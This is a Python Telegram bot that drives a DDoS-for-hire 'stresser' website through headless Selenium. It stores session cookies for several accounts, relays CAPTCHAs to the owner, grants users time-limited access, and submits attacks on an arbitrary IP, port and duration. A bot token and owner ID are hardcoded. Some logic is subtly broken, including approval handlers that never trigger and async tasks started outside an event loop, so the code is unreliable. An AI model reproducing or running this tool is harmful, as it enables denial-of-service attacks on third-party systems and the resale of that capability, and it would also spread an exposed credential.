import asyncio
import time
import logging
import os
import re
import json
import string
import random
import pickle
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

BOT_TOKEN = "8562518597:AAGpVd-4xGZx3mJgkXQo2AYUKooJE_JWgZk"
OWNER_ID = 6643958471

DATA_JSON = "users_data.json"
ACCOUNTS_FILE = "accounts.json"
COOKIES_DIR = "cookies"

if not os.path.exists(COOKIES_DIR):
    os.makedirs(COOKIES_DIR)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_state = {}
data = {
    "approved_users": {},
    "disapproved_users": []
}
accounts = {}

MIN_ATTACK_TIME = 30
MAX_ATTACK_TIME = 300

def load_data():
    global data, accounts
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON) as f:
                data = json.load(f)
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE) as f:
                accounts = json.load(f)
            for token in list(accounts.keys()):
                if "cookies_file" in accounts[token]:
                    accounts[token]["driver"] = None
                    accounts[token]["busy_until"] = 0
    except:
        pass

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
        acc_save = {}
        for token, acc in accounts.items():
            acc_save[token] = {
                "cookies_file": acc.get("cookies_file", ""),
                "logged_in": True
            }
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(acc_save, f, indent=4)
    except:
        pass

def is_owner(user_id):
    return user_id == OWNER_ID

def is_approved(user_id):
    if is_owner(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        return True
    return False

def get_cookie_file(token):
    safe = re.sub(r'[^a-zA-Z0-9]', '_', token)[:30]
    return os.path.join(COOKIES_DIR, f"{safe}.pkl")

def get_free_accounts():
    now = time.time()
    return [t for t, a in accounts.items() if a.get("driver") and now >= a.get("busy_until", 0)]

def get_busy_accounts():
    now = time.time()
    return [t for t, a in accounts.items() if a.get("driver") and now < a.get("busy_until", 0)]

async def create_driver_from_cookies(cookie_file):
    try:
        options = Options()
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        if os.path.exists(cookie_file):
            with open(cookie_file, 'rb') as f:
                cookies = pickle.load(f)
            driver.get("https://satellitestress.st")
            await asyncio.sleep(2)
            for c in cookies:
                try:
                    driver.add_cookie(c)
                except:
                    pass
            driver.refresh()
            await asyncio.sleep(3)
            if "dashboard" in driver.current_url or "attack" in driver.current_url:
                return driver
        driver.quit()
        return None
    except:
        return None

async def start_login_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    user_state[user_id] = 'awaiting_token'
    await update.message.reply_text("🔑 Send the website token:")

async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
    user_id = update.effective_user.id
    if token in accounts:
        await update.message.reply_text("❌ Token already exists.")
        user_state.pop(user_id, None)
        return
    context.user_data['temp_token'] = token
    try:
        options = Options()
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        driver.get("https://satellitestress.st/login")
        await asyncio.sleep(10)
        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, "token"))).send_keys(token)
        driver.save_screenshot("captcha.png")
        with open("captcha.png", "rb") as f:
            await update.message.reply_photo(f, caption="✅ Token entered. Send captcha:")
        os.remove("captcha.png")
        context.user_data['login_driver'] = driver
        user_state[user_id] = 'awaiting_captcha'
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        user_state.pop(user_id, None)

async def process_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE, captcha: str):
    user_id = update.effective_user.id
    driver = context.user_data.get('login_driver')
    token = context.user_data.get('temp_token')
    if not driver or not token:
        await update.message.reply_text("❌ Something went wrong.")
        user_state.pop(user_id, None)
        return
    try:
        driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']").send_keys(captcha)
        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
        await asyncio.sleep(6)
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            cookie_file = get_cookie_file(token)
            with open(cookie_file, 'wb') as f:
                pickle.dump(driver.get_cookies(), f)
            accounts[token] = {
                "driver": driver,
                "cookies_file": cookie_file,
                "busy_until": 0
            }
            save_data()
            await update.message.reply_text(f"✅ Account added. Total accounts: {len(accounts)}")
        else:
            driver.save_screenshot("fail.png")
            with open("fail.png", "rb") as f:
                await update.message.reply_photo(f, caption="❌ Login failed.")
            os.remove("fail.png")
            driver.quit()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        if driver:
            driver.quit()
    finally:
        user_state.pop(user_id, None)
        context.user_data.clear()

async def account_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    free = get_free_accounts()
    busy = get_busy_accounts()
    await update.message.reply_text(
        f"📊 **Account Status**\n\n"
        f"✅ Free: {len(free)}\n"
        f"🔴 Busy: {len(busy)}\n"
        f"👥 Total: {len(accounts)}",
        parse_mode='Markdown'
    )

async def set_attack_time_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    user_state[user_id] = 'awaiting_attack_time'
    await update.message.reply_text(
        f"⏱️ Current: {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}s\nSend: `<min> <max>`"
    )

async def process_set_attack_time(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    global MIN_ATTACK_TIME, MAX_ATTACK_TIME
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Use: <min> <max>")
            return
        min_t, max_t = int(parts[0]), int(parts[1])
        if min_t < 10 or max_t > 600 or min_t >= max_t:
            await update.message.reply_text("❌ Invalid. Min 10, Max 600, Min < Max")
            return
        MIN_ATTACK_TIME, MAX_ATTACK_TIME = min_t, max_t
        await update.message.reply_text(f"✅ Time set to {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}s")
    except:
        await update.message.reply_text("❌ Invalid numbers")
    finally:
        user_state.pop(user_id, None)

async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ Not authorized.")
        return
    free = get_free_accounts()
    if not free:
        await update.message.reply_text("⏳ No free accounts. Please wait.")
        return
    user_state[user_id] = ('awaiting_attack', free[0])
    free_count = len(free)
    busy_count = len(get_busy_accounts())
    await update.message.reply_text(
        f"🚀 READY TO ATTACK 🚀\n\n"
        f"📊 Accounts: {free_count} free, {busy_count} busy\n"
        f"Type 👉: <ip> <port> <time>\n"
        f"⏱️ Range: {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}s"
    )

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    if user_id not in user_state or not isinstance(user_state[user_id], tuple):
        return
    state, token = user_state[user_id]
    if state != 'awaiting_attack' or token not in accounts:
        user_state.pop(user_id, None)
        return
    parts = text.strip().split()
    if len(parts) != 3:
        await update.message.reply_text("❌ Use: <ip> <port> <time>")
        user_state.pop(user_id, None)
        return
    ip, port, dur = parts
    try:
        port, dur = int(port), int(dur)
        if dur < MIN_ATTACK_TIME or dur > MAX_ATTACK_TIME:
            await update.message.reply_text(f"❌ Time must be {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}s")
            return
    except:
        await update.message.reply_text("❌ Invalid numbers")
        user_state.pop(user_id, None)
        return
    acc = accounts[token]
    if not acc.get("driver"):
        cf = acc.get("cookies_file")
        if cf and os.path.exists(cf):
            acc["driver"] = await create_driver_from_cookies(cf)
        if not acc.get("driver"):
            await update.message.reply_text("❌ Account driver failed. Try re-adding.")
            user_state.pop(user_id, None)
            return
    driver = acc["driver"]
    acc["busy_until"] = time.time() + dur
    await update.message.reply_text("⚡ Wait 5s...")
    try:
        driver.get("https://satellitestress.st/attack")
        await asyncio.sleep(6)
        w = WebDriverWait(driver, 20)
        w.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='104.29.138.132']"))).send_keys(ip)
        driver.find_element(By.CSS_SELECTOR, "input[placeholder='80']").send_keys(str(port))
        driver.find_element(By.CSS_SELECTOR, "input[placeholder='60']").send_keys(str(dur))
        w.until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(),'Launch Attack')]"))).click()
        await asyncio.sleep(2)
        free = len(get_free_accounts())
        busy = len(get_busy_accounts())
        await update.message.reply_text(
            f"🚀 Attack sent!\n🎯 {ip}:{port} for {dur}s\n📊 Free: {free}, Busy: {busy}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Attack error: {e}")
    finally:
        acc["busy_until"] = 0
        user_state.pop(user_id, None)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    name = update.effective_user.first_name or "User"
    if is_owner(user_id):
        kb = ReplyKeyboardMarkup([
            ["🔐 Login", "🔑 Account Status"],
            ["🚀 Run Attack", "⏱️ Set Attack Time"],
            ["✅ Approve", "❌ Disapprove"],
            ["📊 View Stats", "🔴 Logout"],
            ["🔁 /start"]
        ], resize_keyboard=True)
        await update.message.reply_text("🚀 Owner menu", reply_markup=kb)
    elif is_approved(user_id):
        kb = ReplyKeyboardMarkup([
            ["🚀 Run Attack"],
            ["🔁 /start"]
        ], resize_keyboard=True)
        await update.message.reply_text("✅ Approved user menu", reply_markup=kb)
    else:
        kb = ReplyKeyboardMarkup([["🔁 /start"]], resize_keyboard=True)
        await update.message.reply_text("👤 Use /start", reply_markup=kb)

async def approve_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return
    user_state[uid] = 'awaiting_approve'
    await update.message.reply_text("Send: <id> <days>")

async def process_approve(update, text):
    uid = update.effective_user.id
    try:
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Use: <id> <days>")
            return
        tid, days = parts[0], int(parts[1])
        exp = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        data["approved_users"][tid] = {"expiry": exp}
        if int(tid) in data.get("disapproved_users", []):
            data["disapproved_users"].remove(int(tid))
        save_data()
        await update.message.reply_text(f"✅ User {tid} approved for {days} days")
    except:
        await update.message.reply_text("❌ Error")
    finally:
        user_state.pop(uid, None)

async def disapprove_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return
    user_state[uid] = 'awaiting_disapprove'
    await update.message.reply_text("Send user ID:")

async def process_disapprove(update, text):
    uid = update.effective_user.id
    try:
        tid = int(text.strip())
        data["approved_users"].pop(str(tid), None)
        if tid not in data["disapproved_users"]:
            data["disapproved_users"].append(tid)
        save_data()
        await update.message.reply_text(f"❌ User {tid} disapproved")
    except:
        await update.message.reply_text("❌ Error")
    finally:
        user_state.pop(uid, None)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return
    await update.message.reply_text(
        f"📊 Approved: {len(data['approved_users'])}\n"
        f"❌ Disapproved: {len(data['disapproved_users'])}\n"
        f"🔑 Accounts: {len(accounts)}"
    )

async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        return
    for a in accounts.values():
        if a.get("driver"):
            try:
                a["driver"].quit()
            except:
                pass
            a["driver"] = None
    await update.message.reply_text("🔴 All sessions closed.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text

    if text == "🔁 /start":
        await start(update, context)
    elif text == "🔐 Login":
        await start_login_flow(update, context)
    elif text == "🔑 Account Status":
        await account_status(update, context)
    elif text == "🚀 Run Attack":
        await run_attack(update, context)
    elif text == "⏱️ Set Attack Time":
        await set_attack_time_start(update, context)
    elif text == "✅ Approve":
        await approve_start(update, context)
    elif text == "❌ Disapprove":
        await disapprove_start(update, context)
    elif text == "📊 View Stats":
        await show_stats(update, context)
    elif text == "🔴 Logout":
        await logout(update, context)
    elif uid in user_state:
        state = user_state[uid]
        if state == 'awaiting_token':
            await process_token(update, context, text)
        elif state == 'awaiting_captcha':
            await process_captcha(update, context, text)
        elif state == 'awaiting_attack_time':
            await process_set_attack_time(update, context, text)
        elif isinstance(state, dict):
            if state.get('action') == 'approve':
                await process_approve(update, text)
            elif state.get('action') == 'disapprove':
                await process_disapprove(update, text)
        elif isinstance(state, tuple) and state[0] == 'awaiting_attack':
            await process_attack(update, context, text)

def main():
    load_data()
    for token, acc in accounts.items():
        cf = acc.get("cookies_file")
        if cf and os.path.exists(cf):
            asyncio.create_task(create_driver_from_cookies(cf))
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 BOT RUNNING")
    app.run_polling()

if __name__ == "__main__":
    main()